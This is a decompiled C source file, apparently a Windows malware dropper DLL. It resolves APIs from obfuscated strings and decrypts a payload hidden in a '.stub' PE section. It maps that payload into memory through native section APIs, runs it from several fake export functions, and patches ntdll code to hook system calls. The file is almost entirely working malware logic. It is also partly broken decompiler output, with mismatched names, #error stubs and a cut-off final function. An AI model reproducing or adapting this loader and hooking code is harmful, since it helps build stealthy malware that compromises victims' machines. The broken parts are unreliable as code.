/* This file has been generated.
Copyright (c) 2013 Rob Coleman <bliepding@gmail.com>

Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Data declarations

extern int dword_10001A90[8]; // weak
extern char *off_10001AB2; // weak
extern char byte_10001AB9[3]; // weak
extern char byte_10001B87; // weak

typedef struct {
	HMODULE Handle_NtdllDll; // weak
	DWORD field_4;
	int (__stdcall *proc_lstrcmpiW)(LPCTSTR lpString1, LPCTSTR lpString2); // weak
	SIZE_T (__stdcall *proc_VirtualQuery)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength); // weak
	BOOL (__stdcall *proc_VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect); // weak
	FARPROC (__stdcall *proc_GetProcAddress)(HMODULE hModule, LPCSTR lpProcName); // weak
	LPVOID (__stdcall *proc_MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap); // weak
	BOOL (__stdcall *proc_UnmapViewOfFile)(LPCVOID lpBaseAddress); // weak
	BOOL (__stdcall *proc_FlushInstructionCache)(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize); // weak
	HMODULE (__stdcall *proc_LoadLibraryW)(LPCTSTR lpFileName); // weak
	BOOL (__stdcall *proc_FreeLibrary)(HMODULE hModule); // weak
	NTSTATUS (__stdcall *proc_ZwCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, DWORD ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle); // weak
	NTSTATUS (__stdcall *proc_ZwMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect); // weak
	HANDLE (__stdcall *proc_CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); // weak
	DWORD (__stdcall *proc_WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds); // weak
	BOOL (__stdcall *proc_GetExitCodeThread)(HANDLE hThread, LPDWORD lpExitCode); // weak
	NTSTATUS (__stdcall *proc_ZwClose)(HANDLE Handle); // weak
} obfuscatedImports;

extern obfuscatedImports Imports;

//obfuscated strings
// see Scramble_Bytes and Scramble_Words
// obfb - ascii (byte)
// obfw - unicode (word)
extern BYTE obfb_Kernel32dll_aslr[48]; // weak
extern BYTE obfb_lstrcmpiW[20]; // weak
extern BYTE obfb_VirtualQuery[28]; // weak
extern BYTE obfb_VirtualProtect[32]; // weak
extern BYTE obfb_GetProcAddress[32]; // weak
extern BYTE obfb_MapViewOfFile[28]; // weak
extern BYTE obfb_UnmapViewOfFile[32]; // weak
extern BYTE obfb_FlushInstructionCache[44]; // weak
extern BYTE obfb_LoadLibraryW[28]; // weak
extern BYTE obfb_FreeLibrary[24]; // weak
extern BYTE obfb_ZwCreateSection[32]; // weak
extern BYTE obfb_ZwMapViewOfSection[40]; // weak
extern BYTE obfb_CreateThread[28]; // weak
extern BYTE obfb_WaitForSingleObject[40]; // weak
extern BYTE obfb_GetExitCodeThread[36]; // weak
extern BYTE obfb_ZwClose[16]; // weak
extern BYTE obfb_CreateRemoteThread[40]; // weak
extern BYTE obfb_NtCreateThreadEx[36]; // weak
extern BYTE obfw_kernel32_dll[28]; // weak
extern BYTE obfw_ntdll_dll[20]; // weak

extern char String2[]; // idb
extern int dword_10004000; // weak
extern int dword_10004010; // weak
extern _DWORD dword_10004014; // idb
extern _UNKNOWN unk_10004018; // weak
extern int dword_1000401C; // weak

//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

BOOL __stdcall DllUnregisterServerEx(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
HRESULT __stdcall DllCanUnloadNow();
HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv);
signed int __cdecl DllRegisterServerEx();
signed int __stdcall CPlApplet(int a1);
BOOL __stdcall DllGetClassObjectEx(int a1, int a2, int a3, int a4);
signed int __cdecl sub_1000109B();
static void Scramble_ByteSequence(byte *buffer, unsigned int Key);
//void __usercall Scramble_ByteSequence<eax>(byte *buffer<ecx>, unsigned int Key<edi>)
signed int __cdecl sub_10001161(int a1, int a2);
BOOL __cdecl sub_100011EE();
signed int __cdecl GetNeededProcAddresses();
signed int __cdecl CreateSectionAndView(HANDLE ProcessHandle, ULONG_PTR a2, PHANDLE SectionHandle, PVOID *BaseAddress0, PVOID *BaseAddress1);
int __cdecl sub_10001456(void **a1, int a2, int a3, int a4, const void *a5, unsigned int a6);
int __cdecl sub_100014A4(int, LPCWSTR lpString2); // idb
int __cdecl sub_10001559(int a1, const void *a2, const void *a3, unsigned int a4, int a5, const void *a6, unsigned int a7, int a8);
signed int __cdecl sub_100016A5(int a1, int a2, const void *a3);
unsigned int __cdecl sub_100017BE();
signed int (__cdecl *__cdecl sub_100017CD())(int);
unsigned int __cdecl sub_100017D7();
unsigned int __cdecl sub_100017E6();
int __cdecl sub_100017F5(int a1, int a2, int a3, int a4);
int __cdecl sub_10001969(LPCWSTR lpString2, const void *a2, unsigned int a3, int a4);
void __fastcall sub_10001DAF(int a1, int a2);
obfuscatedImports * __cdecl GetHandleToNtdll();
// int __usercall sub_10001E44<eax>(int a1<eax>, int a2<edx>, int a3<ecx>);
void __cdecl Scramble_Bytes(BYTE * input, char * output);
void __cdecl Scramble_Words(WORD * input, wchar_t * output);
HMODULE __cdecl AcquireHandleToNtdll();
FARPROC __cdecl GetScrambledProcAddress(WORD * Module, BYTE * Proc);
void __cdecl memcpy_wrapper_1(void *Dst, const void *Src, unsigned int Size);
FARPROC __cdecl GetScrambledProcAddressFromKernel32(BYTE * Proc);
FARPROC __cdecl GetScrambledProcAddressFromNtdll(BYTE * Proc);
signed int __cdecl sub_10002060(int a1);
int __stdcall sub_100021FE(int a1);
int __cdecl sub_10002271(int a1, int a2, int a3);
signed int __stdcall sub_10002334(int a1);
void __cdecl memcpy_wrapper_2(void *a1, const void *a2, unsigned int a3);
int __cdecl sub_100024A7(const void *a1, int a2, void *a3);
signed int __cdecl sub_10002529(int a1, int a2);
signed int __cdecl sub_100025C7(int a1, int a2, const void *a3, int a4);
void __cdecl sub_100026A8();
// void __stdcall ExitProcess(UINT uExitCode);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName);
// BOOL __stdcall GetVersionExW(LPOSVERSIONINFOW lpVersionInformation);
// int __stdcall lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// HANDLE __stdcall GetCurrentProcess();
// DWORD __stdcall GetCurrentThreadId();
// DWORD __stdcall GetTickCount();
// LPWSTR __stdcall lstrcpyW(LPWSTR lpString1, LPCWSTR lpString2);
// int __stdcall lstrlenW(LPCWSTR lpString);
// int wsprintfW(LPWSTR, LPCWSTR, ...);


//----- (1000101B) --------------------------------------------------------
BOOL __stdcall DllUnregisterServerEx(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if ( fdwReason )
	{
		if ( fdwReason == 1 )
		{
			dword_1000401C = (int)hinstDLL;
			sub_100011EE();
		}
	}
	return 0;
}
// 1000401C: using guessed type int dword_1000401C;

//----- (1000103D) --------------------------------------------------------
HRESULT __stdcall DllCanUnloadNow()
{
	dword_1000401C = (int)GetModuleHandleW(0);
	sub_100011EE();
	ExitProcess(0);
}
// 1000401C: using guessed type int dword_1000401C;

//----- (1000105B) --------------------------------------------------------
HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
{
	return sub_100011EE();
}
// 1000105B: inconsistent function type and number of purged bytes

//----- (10001064) --------------------------------------------------------
signed int __cdecl DllRegisterServerEx()
{
	sub_100011EE();
	return 1;
}

//----- (10001070) --------------------------------------------------------
signed int __stdcall CPlApplet(int a1)
{
	if ( *(_DWORD *)(a1 + 8) )
		DeleteFileA(*(LPCSTR *)(a1 + 8));
	sub_100011EE();
	return 1;
}

//----- (10001090) --------------------------------------------------------
BOOL __stdcall DllGetClassObjectEx(int a1, int a2, int a3, int a4)
{
	return sub_100011EE();
}

//----- (1000109B) --------------------------------------------------------
signed int __cdecl sub_1000109B()
{
	signed int result; // eax@1
	int v1; // esi@2
	FARPROC v2; // eax@3
	int v3; // [sp+0h] [bp-Ch]@1
	int v4; // [sp+4h] [bp-8h]@1
	HMODULE hLibModule; // [sp+8h] [bp-4h]@2

	result = sub_10001161((int)&v4, (int)&v3);
	if ( result )
	{
		v1 = v4;
		Scramble_ByteSequence(v4 + *(_DWORD *)v4, *(_DWORD *)(v4 + 4));
		result = sub_10001969(0, (const void *)(v1 + *(_DWORD *)v1), *(_DWORD *)(v1 + 4), (int)&hLibModule);
		if ( !result )
		{
			v2 = GetProcAddress(hLibModule, (LPCSTR)0xF);
			if ( v2 )
				((void (__cdecl *)(int, int))v2)(v1, v3);
			result = FreeLibrary(hLibModule);
		}
	}
	return result;
}

//----- (10001103) --------------------------------------------------------
void __usercall Scramble_ByteSequence<eax>(byte *buffer<ecx>, unsigned int Key<edi>)
{
	unsigned int v2; // edx@2
	unsigned int v3; // eax@4
	unsigned int v4; // eax@6
	signed int v6; // [sp+8h] [bp-8h]@1
	unsigned int v7; // [sp+Ch] [bp-4h]@1

	v7 = key >> 1;
	v6 = 4;
	do
	{
		v2 = 0;
		if ( key )
		{
			do
			{
				buffer[v2] ^= 0x96 * (_BYTE)v2;
				++v2;
			}
			while ( v2 < key );
		}
		v3 = 0;
		if ( v7 )
		{
			do
			{
			buffer[v3] ^= *(&buffer[(key + 1) >> 1] + v3);
				++v3;
			}
			while ( v3 < v7 );
		}
		for ( v4 = key - 1; v4 >= 1; --v4 )
			buffer[v4] -= buffer[v4 - 1];
	}
	while ( v6-- - 1 >= 0 );
}

//----- (10001161) --------------------------------------------------------
signed int __cdecl sub_10001161(int a1, int a2)
{
	signed int result; // eax@2
	int v3; // esi@3
	signed int v4; // ebx@5
	int v5; // edi@5
	unsigned int v6; // ecx@10
	int v7; // eax@11

	if ( *(_WORD *)dword_1000401C == 23117 )
	{
		v3 = dword_1000401C + *(_DWORD *)(dword_1000401C + 60);
		if ( *(_DWORD *)v3 == 17744 )
		{
			v5 = *(_WORD *)(v3 + 20) + v3 + 24;
			v4 = 0;
			if ( *(_WORD *)(v3 + 6) <= 0u )
				goto LABEL_8;
			while ( lstrcmpiA((LPCSTR)v5, ".stub") )
			{
				++v4;
				v5 += 40;
				if ( v4 >= *(_WORD *)(v3 + 6) )
					goto LABEL_8;
			}
			v6 = *(_DWORD *)(v5 + 8);
			if ( v6 < 0x22C || (v7 = dword_1000401C + *(_DWORD *)(v5 + 12), *(_DWORD *)v7 != -1371991539) )
			{
LABEL_8:
				result = 0;
			}
			else
			{
				*(_DWORD *)a1 = v7 + 4;
				*(_DWORD *)a2 = v6 - 4;
				result = 1;
			}
		}
		else
		{
			result = 0;
		}
	}
	else
	{
		result = 0;
	}
	return result;
}
// 1000401C: using guessed type int dword_1000401C;

//----- (100011EE) --------------------------------------------------------
BOOL __cdecl sub_100011EE()
{
	BOOL result; // eax@1
	struct _OSVERSIONINFOW VersionInformation; // [sp+0h] [bp-114h]@1

	VersionInformation.dwOSVersionInfoSize = 276;
	result = GetVersionExW(&VersionInformation);
	if ( result )
	{
		if ( VersionInformation.dwPlatformId == 2 )
		{
			if ( VersionInformation.dwMajorVersion >= 5 || VersionInformation.dwMajorVersion <= 6 )
				result = sub_1000109B();
		}
	}
	return result;
}

//----- (1000126B) --------------------------------------------------------
signed int __cdecl GetNeededProcAddresses()
{
	DWORD flOldProtect; // [sp+0h] [bp-4h]@1

	if ( VirtualProtect(&Imports, sizeof(Imports), PAGE_EXECUTE_WRITECOPY, &flOldProtect)
		|| VirtualProtect(&Imports, sizeof(Imports), PAGE_EXECUTE_READWRITE, &flOldProtect) )
	{
    Imports.Handle_NtdllDll = GetModuleHandleToNtdll();
    Imports.proc_lstrcmpiW = (int (__stdcall *)(LPCTSTR, LPCTSTR))GetProcAddressInKernel32(obfb_lstrcmpiW);
    Imports.proc_VirtualQuery = (SIZE_T (__stdcall *)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T))GetProcAddressInKernel32(obfb_VirtualQuery);
    Imports.proc_VirtualProtect = (BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD, PDWORD))GetProcAddressInKernel32(obfb_VirtualProtect);
    Imports.proc_GetProcAddress = (FARPROC (__stdcall *)(HMODULE, LPCSTR))GetProcAddressInKernel32(obfb_GetProcAddress);
    Imports.proc_MapViewOfFile = (LPVOID (__stdcall *)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))GetProcAddressInKernel32(obfb_MapViewOfFile);
    Imports.proc_UnmapViewOfFile = (BOOL (__stdcall *)(LPCVOID))GetProcAddressInKernel32(obfb_UnmapViewOfFile);
    Imports.proc_FlushInstructionCache = (BOOL (__stdcall *)(HANDLE, LPCVOID, SIZE_T))GetProcAddressInKernel32(obfb_FlushInstructionCache);
    Imports.proc_LoadLibraryW = (HMODULE (__stdcall *)(LPCTSTR))GetProcAddressInKernel32(obfb_LoadLibraryW);
    Imports.proc_FreeLibrary = (BOOL (__stdcall *)(HMODULE))GetProcAddressInKernel32(obfb_FreeLibrary);
    Imports.proc_ZwCreateSection = (NTSTATUS (__stdcall *)(PHANDLE, ACCESS_MASK, DWORD, PLARGE_INTEGER, ULONG, ULONG, HANDLE))GetProcAddressInNtdll(obfb_ZwCreateSection);
    Imports.proc_ZwMapViewOfSection = (NTSTATUS (__stdcall *)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG))GetProcAddressInNtdll(obfb_ZwMapViewOfSection);
    Imports.proc_CreateThread = (HANDLE (__stdcall *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddressInKernel32(obfb_CreateThread);
    Imports.proc_WaitForSingleObject = (DWORD (__stdcall *)(HANDLE, DWORD))GetProcAddressInKernel32(obfb_WaitForSingleObject);
    Imports.proc_GetExitCodeThread = (BOOL (__stdcall *)(HANDLE, LPDWORD))GetProcAddressInKernel32(obfb_GetExitCodeThread);
    Imports.proc_ZwClose = (NTSTATUS (__stdcall *)(HANDLE))GetProcAddressInNtdll(obfb_ZwClose);
		return 1;
	}
	return 0;
}

//----- (100013A6) --------------------------------------------------------
signed int __cdecl CreateSectionAndView(HANDLE ProcessHandle, ULONG_PTR a2, PHANDLE SectionHandle, PVOID *BaseAddress0, PVOID *BaseAddress1)
{
  signed int result; // eax@2
  HANDLE v6; // eax@3
  ULONG_PTR ViewSize; // [sp+0h] [bp-10h]@1
  NTSTATUS v8; // [sp+4h] [bp-Ch]@3
  LARGE_INTEGER MaximumSize; // [sp+8h] [bp-8h]@1

  ViewSize = a2;
  MaximumSize = (LARGE_INTEGER)a2;
  if ( Imports.proc_ZwCreateSection(
         SectionHandle,
         SECTION_EXTEND_SIZE|SECTION_MAP_EXECUTE|SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_QUERY|0xF0000,
         0,
         &MaximumSize,
         0x40u,
         0x8000000u,
         0) )
  {
    result = -5;
  }
  else
  {
    v6 = GetCurrentProcess();
    v8 = Imports.proc_ZwMapViewOfSection(*SectionHandle, v6, BaseAddress0, 0, 0, 0, &ViewSize, 1u, 0, 0x40u);
    if ( v8 )
    {
      result = -5;
    }
    else
    {
      v8 = Imports.proc_ZwMapViewOfSection(
             *SectionHandle,
             ProcessHandle,
             BaseAddress1,
             0,
             0,
             0,
             &ViewSize,
             1u,
             0,
             0x40u);
      if ( v8 )
        result = -5;
      else
        result = 0;
    }
  }
  return result;
}

//----- (10001456) --------------------------------------------------------
int __cdecl sub_10001456(void **a1, int a2, int a3, int a4, const void *a5, unsigned int a6)
{
	int result; // eax@3

	if ( a6 )
		memcpy_wrapper_1(*a1, a5, a6);
	*(_DWORD *)a4 = *(_DWORD *)a3 + a2;
	*(_DWORD *)(a4 + 4) = a6;
	*a1 = (char *)*a1 + a6;
	result = a6 + *(_DWORD *)a3;
	*(_DWORD *)a3 = result;
	return result;
}

//----- (100014A4) --------------------------------------------------------
signed int __cdecl sub_100014A4(int a1, LPCWSTR lpString2)
{
	DWORD v3; // esi@5
	wchar_t Unscrambled[42];
	DWORD v5; // [sp+5Ch] [bp-4h]@5

	if ( lpString2 )
	{
		if ( lstrlenW(lpString2) >= 31 )
			return -1;
		lstrcpyW((LPWSTR)(a1 + 16), lpString2);
	}
	else
	{
		v3 = GetTickCount();
		v5 = 3 * GetCurrentThreadId() + v3;
		Scramble_Words(obfb_Kernel32dll_aslr, Unscrambled);
		do
		wsprintfW((LPWSTR)(a1 + 16), Unscrambled, v5++);
		while ( GetModuleHandleW((LPCWSTR)(a1 + 16)) );
	}
	*(_DWORD *)a1 = a1 ^ 0xAE1979DD;
	*(_DWORD *)(a1 + 4) = 0;
	*(_DWORD *)(a1 + 12) = sub_10002334;
	return 0;
}

//----- (10001559) --------------------------------------------------------
int __cdecl sub_10001559(int a1, const void *a2, const void *a3, unsigned int a4, int a5, const void *a6, unsigned int a7, int a8)
{
	int result; // eax@2
	int v9; // [sp+4h] [bp-28h]@1
	int v10; // [sp+8h] [bp-24h]@3
	int v11; // [sp+Ch] [bp-20h]@6
	int v12; // [sp+10h] [bp-1Ch]@1
	int v13; // [sp+14h] [bp-18h]@1
	int v14; // [sp+18h] [bp-14h]@3
	unsigned int v15; // [sp+1Ch] [bp-10h]@1
	int v16; // [sp+20h] [bp-Ch]@1
	int v17; // [sp+24h] [bp-8h]@3
	int v18; // [sp+28h] [bp-4h]@1

	v13 = 0;
	v16 = 0;
	v12 = 0;
	v15 = a4 + a7 + 152;
	v18 = CreateSectionAndView(a1, a4 + a7 + 152, (PHANDLE)&v9, (PVOID)&v13, (PVOID)&v16);
	if ( v18 )
	{
		result = v18;
	}
	else
	{
		v17 = v13;
		v13 += 152;
		v12 = 152;
		sub_10001456((void **)&v13, v16, (int)&v12, v17 + 132, a6, a7);
		v10 = v13;
		sub_10001456((void **)&v13, v16, (int)&v12, v17 + 140, a3, a4);
		v14 = v10;
		if ( a4 >= 0x1000 )
		{
			if ( *(_WORD *)v14 == 23117 )
			{
				if ( *(_DWORD *)(v14 + 60) + 248 < a4 )
				{
					v11 = *(_DWORD *)(v14 + 60) + v10;
					if ( *(_DWORD *)(v11 + 204) == 72 )
						*(_DWORD *)(v11 + 204) = 64;
				}
			}
		}
		memcpy_wrapper_1((void *)v17, a2, 0x80u);
		*(_DWORD *)(v17 + 148) = a5;
		*(_DWORD *)(v17 + 128) = 0;
		*(_DWORD *)a8 = v16;
		Imports.proc_UnmapViewOfFile(v17);
		Imports.proc_ZwClose(v9);
		result = 0;
	}
	return result;
}

//----- (100016A5) --------------------------------------------------------
signed int __cdecl sub_100016A5(int a1, int a2, const void *a3)
{
	signed int result; // eax@2
	int v4; // [sp+0h] [bp-90h]@5
	int v5; // [sp+4h] [bp-8Ch]@7
	signed int v6; // [sp+8h] [bp-88h]@1
	int v7; // [sp+Ch] [bp-84h]@1
	unsigned int v8; // [sp+10h] [bp-80h]@1
	int v9; // [sp+14h] [bp-7Ch]@1
	int v10; // [sp+18h] [bp-78h]@7
	char v11; // [sp+20h] [bp-70h]@5

	memcpy_wrapper_1(&v8, a3, 0x80u);
	v8 = (unsigned int)&v8 ^ 0xAE1979DD;
	v9 = 0;
	v7 = (char *)&dword_10001F1A + *(_DWORD *)(a1 + 8) - byte_10001AB9;
	v6 = sub_100025C7(
		(char *)&dword_10001F1A + *(_DWORD *)(a1 + 8) - byte_10001AB9,
		(int)&v8,
		*(const void **)(a2 + 140),
		*(_DWORD *)(a2 + 144));
	if ( v6 )
	{
		result = v6;
	}
	else
	{
		if ( sub_10002529(a1, v7) )
		{
			result = -4;
		}
		else
		{
			v4 = (*(int (__stdcall **)(char *))(v7 + 36))(&v11);
			if ( v4 )
			{
				*(_DWORD *)(a2 + 128) = v4;
				v5 = v10;
				if ( v10 )
				{
					v10 = 0;
					(*(void (__stdcall **)(int))(v7 + 64))(v5);
				}
				result = 0;
			}
			else
			{
				result = -9;
			}
		}
	}
	return result;
}
// 10001F1A: using guessed type int dword_10001F1A;

//----- (100017BE) --------------------------------------------------------
unsigned int __cdecl sub_100017BE()
{
	return (char *)sub_100026A8 - (char *)(void (__cdecl *)())sub_10002060;
}

//----- (100017CD) --------------------------------------------------------
signed int (__cdecl *__cdecl sub_100017CD())(int)
{
	return sub_10002060;
}

//----- (100017D7) --------------------------------------------------------
unsigned int __cdecl sub_100017D7()
{
	return (char *)sub_100021FE - (char *)(int (__stdcall *)(int))sub_10002060;
}

//----- (100017E6) --------------------------------------------------------
unsigned int __cdecl sub_100017E6()
{
	return (char *)sub_10002334 - (char *)(signed int (__stdcall *)(int))sub_10002060;
}

//----- (100017F5) --------------------------------------------------------
int __cdecl sub_100017F5(int a1, int a2, int a3, int a4)
{
	int result; // eax@2
	unsigned int v5; // ST14_4@3
	signed int (__cdecl *v6)(int); // eax@3
	int v7; // [sp+8h] [bp-28h]@1
	int v8; // [sp+Ch] [bp-24h]@3
	unsigned int v9; // [sp+10h] [bp-20h]@3
	int v10; // [sp+14h] [bp-1Ch]@1
	int v11; // [sp+18h] [bp-18h]@1
	unsigned int v12; // [sp+1Ch] [bp-14h]@1
	int v13; // [sp+20h] [bp-10h]@1
	int v14; // [sp+24h] [bp-Ch]@3
	unsigned int v15; // [sp+28h] [bp-8h]@1
	int v16; // [sp+2Ch] [bp-4h]@1

	v11 = 0;
	v13 = 0;
	v15 = sub_100017BE();
	v12 = v15
		+ (char *)sub_10001F5E
		- (char *)(int (__cdecl *)(int, int))byte_10001AB9
		+ byte_10001AB9
		- (char *)dword_10001A90
		+ 36;
	v10 = 0;
	v16 = CreateSectionAndView(
		a1,
		v12,
		(PHANDLE)&v7,
		(PVOID)&v11,
		(PVOID)&v13);
	if ( v16 )
	{
		result = v16;
	}
	else
	{
		v14 = v11;
		v11 += 36;
		v10 = 36;
		sub_10001456(
			(void **)&v11,
			v13,
			(int)&v10,
			v14 + 8,
			byte_10001AB9,
			(char *)sub_10001F5E - (char *)(int (__cdecl *)(int, int))byte_10001AB9);
		v8 = v10;
		sub_10001456((void **)&v11, v13, (int)&v10, v14 + 24, dword_10001A90, byte_10001AB9 - (char *)dword_10001A90);
		v5 = v15;
		v6 = sub_100017CD();
		sub_10001456((void **)&v11, v13, (int)&v10, v14 + 16, v6, v5);
		v9 = (char *)&off_10001AB2 - (char *)dword_10001A90 + v8 + v14;
		*(_DWORD *)((char *)&off_10001AB2 - (char *)dword_10001A90 + v8 + v14) = *(_DWORD *)(v14 + 8)
			+ &byte_10001B87
			- byte_10001AB9;
		*(_DWORD *)v14 = *(_DWORD *)(v14 + 16) + sub_100017D7();
		*(_DWORD *)(v14 + 4) = *(_DWORD *)(v14 + 16) + sub_100017E6();
		*(_DWORD *)(v14 + 32) = a2;
		*(_DWORD *)a3 = *(_DWORD *)(v14 + 16);
		*(_DWORD *)a4 = v13;
		Imports.proc_UnmapViewOfFile(v14);
		Imports.proc_ZwClose(v7);
		result = 0;
	}
	return result;
}
// 10001A90: using guessed type int dword_10001A90[8];
// 10001AB2: using guessed type char *off_10001AB2;
// 10001B87: using guessed type char byte_10001B87;
// 10001F36: using guessed type int (__stdcall *dword_10001F36)(_DWORD);
// 10001F5A: using guessed type int (__stdcall *dword_10001F5A)(_DWORD);

//----- (10001969) --------------------------------------------------------
int __cdecl sub_10001969(LPCWSTR lpString2, const void *a2, unsigned int a3, int a4)
{
	int result; // eax@1
	int v5; // eax@6
	int v6; // ST14_4@9
	int v7; // eax@9
	DWORD v8; // [sp-4h] [bp-88h]@1
	int v9; // [sp+0h] [bp-84h]@6
	int v10; // [sp+0h] [bp-84h]@9
	signed int v11; // [sp+0h] [bp-84h]@12
	int v12; // [sp+4h] [bp-80h]@1

	result = sub_100014A4((int)&v12, lpString2);
	if ( !result )
	{
		if ( dword_10004000 && !GetNeededProcAddresses() )
			return -12;
		v5 = (int)GetCurrentProcess();
		v9 = sub_10001559(v5, &v12, a2, a3, -1, 0, 0, (int)&dword_10004014);
		if ( v9 )
			return v9;
		if ( dword_10004000 )
		{
			v6 = dword_10004014;
			v7 = (int)GetCurrentProcess();
			v10 = sub_100017F5(v7, v6, (int)&unk_10004018, (int)&dword_10004010);
			if ( v10 )
				return v10;
			dword_10004000 = 0;
		}
		v11 = sub_100016A5(dword_10004010, dword_10004014, &v12);
		if ( !v11 )
			*(_DWORD *)a4 = *(_DWORD *)(dword_10004014 + 128);
		Imports.proc_UnmapViewOfFile(dword_10004014);
		result = v11;
	}
	return result;
}
// 10001F36: using guessed type int (__stdcall *dword_10001F36)(_DWORD);
// 10004000: using guessed type int dword_10004000;
// 10004010: using guessed type int dword_10004010;

//----- (10001AB6) --------------------------------------------------------
#error "FFFFFFFF: positive sp value has been found (funcsize=0)"

//----- (10001B78) --------------------------------------------------------
#error "FFFFFFFF: positive sp value has been found (funcsize=0)"

//----- (10001DAF) --------------------------------------------------------
void __fastcall sub_10001DAF(int a1, int a2)
{
	unsigned int v2; // esi@1
	int v3; // edx@1
	int v4; // eax@3
	int *v5; // [sp+4h] [bp-38h]@1
	signed int v6; // [sp+8h] [bp-34h]@1
	int v7; // [sp+Ch] [bp-30h]@1
	int v8; // [sp+18h] [bp-24h]@2
	int v9; // [sp+28h] [bp-14h]@1
	int v10; // [sp+2Ch] [bp-10h]@1
	char v11; // [sp+30h] [bp-Ch]@1

	obfuscatedImports * Imports;

	v10 = a1;
	v9 = a2;
	v6 = 28;
	v5 = &v7;
	Imports = GetHandleToNtdll();
	Imports->proc_VirtualQuery(&v5, v5, v6);
	v2 = (unsigned int)&v11;
	do
	{
		if ( v2 >= v8 + v7 )
			break;
		v4 = *(_DWORD *)v2;
		v2 += 4;
	}
	while ( (v4 ^ 0xAE1979DD) + 4 != v2 );
}

//----- (10001DF1) --------------------------------------------------------
obfuscatedImports * __cdecl GetHandleToNtdll()
{
	return (obfuscatedImports *)&Handle_Ntdll_dll;
}

//----- (10001E44) --------------------------------------------------------
int __usercall sub_10001E44<eax>(int a1<eax>, int a2<edx>, int a3<ecx>)
{
	int v3; // eax@1
	int v4; // ecx@1
	int v5; // edx@1
	int v6; // eax@2
	int v7; // edx@2
	int v8; // ecx@2
	int v9; // ST00_4@2
	int v10; // edx@2
	int v11; // edx@11
	int v12; // eax@11
	int v15; // [sp-10h] [bp-10h]@2
	int v16; // [sp-Ch] [bp-Ch]@1
	int v17; // [sp-8h] [bp-8h]@1
	int v18; // [sp-4h] [bp-4h]@1
	obfuscatedImports * Imports;


	v18 = a1;
	v17 = a3;
	v16 = a2;
	Imports = GetHandleToNtdll();
	Imports->field_4 = 0;
	v3 = Imports->proc_GetProcAddress(Imports->Handle_Ntdll_dll, v16);
	v4 = v17;
	if ( v3 )
	{
		v17 = v3;
		v16 = v4;
		v15 = v3;
		v9 = v3;
		Imports = GetHandleToNtdll();
		v7 = Imports->proc_VirtualProtect(v9, 24, PAGE_EXECUTE_WRITECOPY, &v15);
		v8 = v16;
		v6 = v17;
		if ( v7 )
		{
			if ( *(_BYTE *)v17 == -72 )
			{
				if ( *(_BYTE *)(v17 + 5) == -70 )
				{
					if ( *(_WORD *)(v17 + 10) != -11521 )
					{
						if ( *(_WORD *)(v17 + 10) != 4863 )
							return v18;
						*(_BYTE *)(v17 + 11) = -46;
					}
					*(_DWORD *)(v6 + 6) = v8;
					return v18;
				}
				if ( *(_DWORD *)(v17 + 5) == 69489805 )
				{
					if ( *(_DWORD *)(v17 + 8) == -1037120252 )
					{
						*(_DWORD *)(v17 + 6) = v16 - v17 - 10;
						*(_BYTE *)(v6 + 5) = -24;
						*(_BYTE *)(v6 + 10) = -112;
					}
				}
				else
				{
					if ( *(_DWORD *)(v17 + 7) == 69489805 )
					{
						if ( *(_DWORD *)(v17 + 11) == -1072300188 )
						{
							if ( *(_DWORD *)(v17 + 15) == -1040187392 )
							{
								v17 = v7;
								Imports = GetHandleToNtdll();
								Imports->field_4 = 1;
								v16 = v12;
								_ESI = v12;
								__asm { lock cmpxchg8b qword ptr [esi+0Ah] }
							}
						}
					}
				}
			}
		}
	}
	return v18;
}

//----- (10001F5E) --------------------------------------------------------
void __cdecl Scramble_Bytes(BYTE * input, char * output)
{
	if ( input )
	{
		for( ; *output = *input ^ 0x12; ++output, input += 2) {}
	}
	else
	{
		*output = 0;
	}
}

	//----- (10001F81) --------------------------------------------------------
	void __cdecl Scramble_Words(WORD * input, wchar_t * output)
	{
		if ( input )
		{
			for(; *output = *input ^ 0xAE12; ++input, ++output) {}
		}
		else
		{
			*output = 0;
		}
	}

	//----- (10001FBE) --------------------------------------------------------
	HMODULE __cdecl AcquireHandleToNtdll()
	{
		wchar_t ModuleName[100];

